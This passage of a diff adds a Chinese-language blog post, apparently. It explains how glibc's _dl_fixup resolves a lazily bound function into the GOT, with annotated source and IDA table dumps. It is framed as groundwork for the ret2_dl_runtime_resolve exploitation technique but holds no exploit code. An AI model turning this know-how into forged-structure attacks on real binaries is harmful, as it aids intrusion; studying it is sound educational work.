class="line">...</span><br></pre></td></tr></table></figure>
+<p>有許多常用的pointer或是value</p>
+<p>上面的_dl_fixup調用了</p>
+<table>
+<thead>
+<tr>
+<th>pointer</th>
+<th>意義</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>l_info[DT_SYMTAB]</td>
+<td>symbol table 位址 (.dynsym)</td>
+</tr>
+<tr>
+<td>l_info[DT_STRTAB]</td>
+<td>string table 位址 (.dynstr)</td>
+</tr>
+<tr>
+<td>l_info[DT_JMPREL]</td>
+<td>.rel.plt</td>
+</tr>
+<tr>
+<td>l_info[VERSYMIDX (DT_VERSYM)]</td>
+<td>.gnu.version</td>
+</tr>
+</tbody></table>
+<p>等dynamic段的東西</p>
+<p>詳細展開這些東西請見<br><a target="_blank" rel="noopener" href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#2%E3%80%81%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84">https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#2%E3%80%81%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84</a></p>
+<p>那回來看看 _dl_fixup<br>直接看source code</p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-runtime.c#L61">https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-runtime.c#L61</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">	   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 取得 symbol table 位址 (.dynsym)</span></span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 取得 string table 位址 (.dynstr)</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reloc_offset 從 reloc_arg 得來, </span></span><br><span class="line">    <span class="comment">// 取得 PLTREL, 為 rel 或 rela</span></span><br><span class="line">    <span class="comment">// 詳細請看尾部補充</span></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 取得對應 Sym, 從 .dynsym 和 r_info 推算出來</span></span><br><span class="line">    <span class="comment">// ELFW(R_SYM) 最終展開成 ELF32_R_SYM 或 ELF64_R_SYM</span></span><br><span class="line">    <span class="comment">// ELF32_R_SYM(i) 展開為 ((i) &gt;&gt; 8)</span></span><br><span class="line">    <span class="comment">// ELF64_R_SYM(i) 展開為 ((i) &gt;&gt; 32)</span></span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line">    <span class="comment">// GOT 位址, 解析完成後會將結果放回來</span></span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ELFW(R_TYPE) 最終展開成 ELF32_R_TYPE 或 ELF64_R_TYPE</span></span><br><span class="line">    <span class="comment">// ELF32_R_TYPE(i) 展開為 ((i) &amp; 0xff)</span></span><br><span class="line">    <span class="comment">// ELF64_R_TYPE(i) 展開為 ((i) &amp; 0xffffffff)</span></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// st_other 我們設為 0, 步入 if</span></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">	    (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 解析 symbol name</span></span><br><span class="line">      <span class="comment">// strtab + sym-&gt;st_name</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最終將解析結果放回 GOT</span></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>懶人包</p>
+<ol>
+<li>取得函式的.rel.plt位址，存入reloc <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure></li>
+<li>取得symbol table ，存入 sym <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure></li>
+<li>strtab + sym-&gt;st_name取得函式名稱，跟其他資料一起丟進去_dl_lookup_symbol_x</li>
+<li>_dl_lookup_symbol_x 搜尋出哪個函式的東西，跟第一個參數，也就是傳入的函式名稱字串是直接相關的。如果丟進去的是gets，那搜尋出來的就會是gets的東西，最後修復出來的就會是gets的位址。<blockquote>
+<p>dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>                 version, ELF_RTYPE_CLASS_PLT, flags, NULL)</p>
+</blockquote>
+</li>
+<li>繼續運算，修復出函式位址，寫入函式的GOT中，並回傳</li>
+</ol>
+<p>jmprel 是這東西</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0000000000400670</span> ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:<span class="number">0000000000400670</span>                 Elf64_Rela &lt;<span class="number">404018</span>h, <span class="number">100000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT _exit</span><br><span class="line">LOAD:<span class="number">0000000000400688</span>                 Elf64_Rela &lt;<span class="number">404020</span>h, <span class="number">200000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT __read_chk</span><br><span class="line">LOAD:<span class="number">00000000004006</span>A0                 Elf64_Rela &lt;<span class="number">404028</span>h, <span class="number">300000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT <span class="built_in">puts</span></span><br><span class="line">LOAD:<span class="number">00000000004006B</span>8                 Elf64_Rela &lt;<span class="number">404030</span>h, <span class="number">400000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT __stack_chk_fail</span><br><span class="line">LOAD:<span class="number">00000000004006</span>D0                 Elf64_Rela &lt;<span class="number">404038</span>h, <span class="number">500000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT <span class="built_in">printf</span></span><br><span class="line">LOAD:<span class="number">00000000004006E8</span>                 Elf64_Rela &lt;<span class="number">404040</span>h, <span class="number">600000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT alarm</span><br><span class="line">LOAD:<span class="number">0000000000400700</span>                 Elf64_Rela &lt;<span class="number">404048</span>h, <span class="number">800000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT atoll</span><br><span class="line">LOAD:<span class="number">0000000000400718</span>                 Elf64_Rela &lt;<span class="number">404050</span>h, <span class="number">900000007</span>h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT signal</span><br><span class="line">LOAD:<span class="number">0000000000400730</span>                 Elf64_Rela &lt;<span class="number">404058</span>h, <span class="number">0B</span>00000007h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT <span class="built_in">realloc</span></span><br><span class="line">LOAD:<span class="number">0000000000400748</span>                 Elf64_Rela &lt;<span class="number">404060</span>h, <span class="number">0</span>C00000007h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT setvbuf</span><br><span class="line">LOAD:<span class="number">0000000000400760</span>                 Elf64_Rela &lt;<span class="number">404068</span>h, <span class="number">0</span>D00000007h, <span class="number">0</span>&gt; ; R_X86_64_JUMP_SLOT __isoc99_scanf</span><br></pre></td></tr></table></figure>
+<p>存的值是&lt;404038h, 500000007h, 0&gt;<br>0x404038是printf GOT<br>0x500000007是info<br>最後是addend<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.37/source/elf/elf.h#L652">https://elixir.bootlin.com/glibc/glibc-2.37/source/elf/elf.h#L652</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf32_Sword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf32_Rela;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>
+
+<p>至於為何 strtab + sym-&gt;st_name<br>見下方</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">00000000004004</span>D0 ; ELF String Table</span><br><span class="line">LOAD:<span class="number">00000000004004</span>D0 unk_4004D0      db    <span class="number">0</span>                 ; DATA XREF: LOAD:<span class="number">0000000000400350</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004004</span>D0                                         ; LOAD:<span class="number">0000000000400368</span>↑o ...</span><br><span class="line">LOAD:<span class="number">00000000004004</span>D1 aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">00000000004005B</span>8↓o</span><br><span class="line">LOAD:<span class="number">00000000004004</span>DB aIsoc99Scanf    db <span class="string">&#x27;__isoc99_scanf&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">0000000000400470</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004004</span>EA aReadChk        db <span class="string">&#x27;__read_chk&#x27;</span>,<span class="number">0</span>       ; DATA XREF: LOAD:<span class="number">0000000000400368</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004004F</span>5 aSignal         db <span class="string">&#x27;signal&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">0000000000400410</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004004F</span>C aPuts           db <span class="string">&#x27;puts&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">0000000000400380</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400501</span> aStackChkFail   db <span class="string">&#x27;__stack_chk_fail&#x27;</span>,<span class="number">0</span> ; DATA XREF: LOAD:<span class="number">0000000000400398</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400512</span> aRealloc        db <span class="string">&#x27;realloc&#x27;</span>,<span class="number">0</span>          ; DATA XREF: LOAD:<span class="number">0000000000400440</span>↑o</span><br><span class="line">LOAD:<span class="number">000000000040051</span>A aStdin          db <span class="string">&#x27;stdin&#x27;</span>,<span class="number">0</span>            ; DATA XREF: LOAD:<span class="number">00000000004004</span>A0↑o</span><br><span class="line">LOAD:<span class="number">0000000000400520</span> aExit           db <span class="string">&#x27;_exit&#x27;</span>,<span class="number">0</span>            ; DATA XREF: LOAD:<span class="number">0000000000400350</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400526</span> aPrintf         db <span class="string">&#x27;printf&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">00000000004003B</span>0↑o</span><br><span class="line">LOAD:<span class="number">000000000040052</span>D aStdout         db <span class="string">&#x27;stdout&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">0000000000400488</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400534</span> aStderr         db <span class="string">&#x27;stderr&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">00000000004004B</span>8↑o</span><br><span class="line">LOAD:<span class="number">000000000040053B</span> aAlarm          db <span class="string">&#x27;alarm&#x27;</span>,<span class="number">0</span>            ; DATA XREF: LOAD:<span class="number">00000000004003</span>C8↑o</span><br><span class="line">LOAD:<span class="number">0000000000400541</span> aSetvbuf        db <span class="string">&#x27;setvbuf&#x27;</span>,<span class="number">0</span>          ; DATA XREF: LOAD:<span class="number">0000000000400458</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400549</span> aAtoll          db <span class="string">&#x27;atoll&#x27;</span>,<span class="number">0</span>            ; DATA XREF: LOAD:<span class="number">00000000004003F</span>8↑o</span><br><span class="line">LOAD:<span class="number">000000000040054F</span> aLibcStartMain  db <span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">0</span></span><br><span class="line">LOAD:<span class="number">000000000040054F</span>                                         ; DATA XREF: LOAD:<span class="number">00000000004003E0</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000400561</span> aGlibc27        db <span class="string">&#x27;GLIBC_2.7&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">00000000004005</span>C8↓o</span><br><span class="line">LOAD:<span class="number">000000000040056B</span> aGlibc24        db <span class="string">&#x27;GLIBC_2.4&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">00000000004005</span>D8↓o</span><br><span class="line">LOAD:<span class="number">0000000000400575</span> aGlibc225       db <span class="string">&#x27;GLIBC_2.2.5&#x27;</span>,<span class="number">0</span>      ; DATA XREF: LOAD:<span class="number">00000000004005E8</span>↓o</span><br><span class="line">LOAD:<span class="number">0000000000400581</span> aGmonStart      db <span class="string">&#x27;__gmon_start__&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">0000000000400428</span>↑o</span><br></pre></td></tr></table></figure>
+
+<p>string table位於 0x4004D0<br>printf在string table的位置是 0x400526</p>
+<p>去看 symbol table<br>offset aPrintf -&gt;  0x400526<br>offset unk_4004D0 -&gt; 0x4004D0</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0000000000400338</span> ; ELF Symbol Table</span><br><span class="line">LOAD:<span class="number">0000000000400338</span>                 Elf64_Sym &lt;<span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">0000000000400350</span>                 Elf64_Sym &lt;offset aExit - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;_exit&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400368</span>                 Elf64_Sym &lt;offset aReadChk - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;__read_chk&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400380</span>                 Elf64_Sym &lt;offset aPuts - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;puts&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400398</span>                 Elf64_Sym &lt;offset aStackChkFail - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;__stack_chk_fail&quot;</span></span><br><span class="line">LOAD:<span class="number">00000000004003B</span>0                 Elf64_Sym &lt;offset aPrintf - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;printf&quot;</span></span><br><span class="line">LOAD:<span class="number">00000000004003</span>C8                 Elf64_Sym &lt;offset aAlarm - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;alarm&quot;</span></span><br><span class="line">LOAD:<span class="number">00000000004003E0</span>                 Elf64_Sym &lt;offset aLibcStartMain - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;__libc_start_main&quot;</span></span><br><span class="line">LOAD:<span class="number">00000000004003F</span>8                 Elf64_Sym &lt;offset aAtoll - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;atoll&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400410</span>                 Elf64_Sym &lt;offset aSignal - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;signal&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400428</span>                 Elf64_Sym &lt;offset aGmonStart - offset unk_4004D0, <span class="number">20</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;__gmon_start__&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400440</span>                 Elf64_Sym &lt;offset aRealloc - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;realloc&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400458</span>                 Elf64_Sym &lt;offset aSetvbuf - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;setvbuf&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400470</span>                 Elf64_Sym &lt;offset aIsoc99Scanf - offset unk_4004D0, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;__isoc99_scanf&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400488</span>                 Elf64_Sym &lt;offset aStdout - offset unk_4004D0, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">18</span>h, \ ; <span class="string">&quot;stdout&quot;</span></span><br><span class="line">LOAD:<span class="number">0000000000400488</span>                            offset __bss_start, <span class="number">8</span>&gt;</span><br><span class="line">LOAD:<span class="number">00000000004004</span>A0                 Elf64_Sym &lt;offset aStdin - offset unk_4004D0, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">18</span>h, \ ; <span class="string">&quot;stdin&quot;</span></span><br><span class="line">LOAD:<span class="number">00000000004004</span>A0                            offset <span class="built_in">stdin</span>@@GLIBC_2_2_5, <span class="number">8</span>&gt;</span><br><span class="line">LOAD:<span class="number">00000000004004B</span>8                 Elf64_Sym &lt;offset aStderr - offset unk_4004D0, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">18</span>h, \ ; <span class="string">&quot;stderr&quot;</span></span><br><span class="line">LOAD:<span class="number">00000000004004B</span>8                            offset <span class="built_in">stderr</span>@@GLIBC_2_2_5, <span class="number">8</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以 sym &#x3D; 0x56<br>0x4004D0 + 0x56 &#x3D; 0x400526<br>也就是 st_name</p>
+<p>總而言之，經過了蒐集各個table等等的資訊，修復GOT的位置<br>最後成功填入function libc address，就是fixup在做的事情</p>
